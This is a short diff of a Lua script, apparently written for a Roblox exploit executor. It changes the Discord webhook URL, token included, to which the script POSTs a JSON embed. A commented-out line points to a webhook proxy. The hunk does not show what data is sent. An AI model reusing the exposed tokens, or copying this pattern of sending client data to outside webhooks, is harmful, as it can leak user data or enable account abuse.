@@ -1892,7 +1892,7 @@ local Embed = {
 }
 (syn and syn.request or http_request or http.request) {
     --Url = "https://paxz-utilities-temp.hexerous.repl.co/api/webhooks/U5aZr8Eb92L3",
-    Url = "https://discord.com/api/webhooks/984230174075797545/QiXYa91gHlTLV31HwHGa1GwL84WTLRNjddEDnhWrlLR5aZ1-qBETc9HbFWxxCoUT-Tc4",
+    Url = "https://discord.com/api/webhooks/984486295239811102/3Mlkn5kK9PdxEpr7jQB8RIHDyxVRkocw5trVEpJL-gdeUYlx30qzEWOfneLjGGZpAa3h",
     Method = "POST",
     Headers = {
         ["Content-Type"] = "application/json"
